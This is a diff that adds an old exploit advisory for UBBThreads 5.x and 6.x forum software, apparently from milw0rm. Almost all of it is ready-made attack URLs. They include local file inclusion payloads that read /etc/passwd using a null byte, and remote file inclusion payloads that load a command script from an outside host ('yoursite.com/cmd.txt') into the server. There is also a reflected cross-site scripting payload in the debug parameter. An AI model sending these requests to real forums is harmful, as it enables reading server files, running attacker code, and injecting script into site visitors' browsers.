@@ -1,0 +1,22 @@
+UBBThreads 5.x,6.x Multiple File Inclusion Vulnerabilities
+Contacts > ICQ: 10072 MSN/Mail: nukedx@nukedx.com web: www.nukedx.com
+This exploits works on UBBThreads 5.x,6.x
+Original advisory can be found at: http://www.nukedx.com/?viewdoc=40
+Succesful exploitation register_globals on
+Version 6.x
+GET -> http://[site]/[ubbpath]/includepollresults.php?config[cookieprefix]=&w3t_language=[FILE]
+EXAMPLE -> http://[site]/[ubbpath]/includepollresults.php?config[cookieprefix]=&w3t_language=../../../../../etc/passwd%00
+GET -> http://[site]/[ubbpath]/ubbt.inc.php?GLOBALS[thispath]=[FILE]
+EXAMPLE -> http://[site]/[ubbpath]/ubbt.inc.php?GLOBALS[thispath]=http://yoursite.com/cmd.txt?
+EXAMPLE -> http://[site]/[ubbpath]/ubbt.inc.php?GLOBALS[thispath]=/etc/passwd%00
+If php version < 4.1.0 or UBB version <= 5.x
+GET -> http://[site]/[ubbpath]/ubbt.inc.php?thispath=[FILE]
+EXAMPLE -> http://[site]/[ubbpath]/ubbt.inc.php?thispath=http://yoursite.com/cmd.txt?
+EXAMPLE -> http://[site]/[ubbpath]/ubbt.inc.php?thispath=/etc/passwd%00
+XSS:
+GET -> http://[site]/[ubbpath]/index.php?debug=[XSS]
+EXAMPLE -> http://[site]/[ubbpath]/index.php?debug=<script>alert();</script>
+
+# nukedx.com [2006-05-27]
+
+# milw0rm.com [2006-05-28]
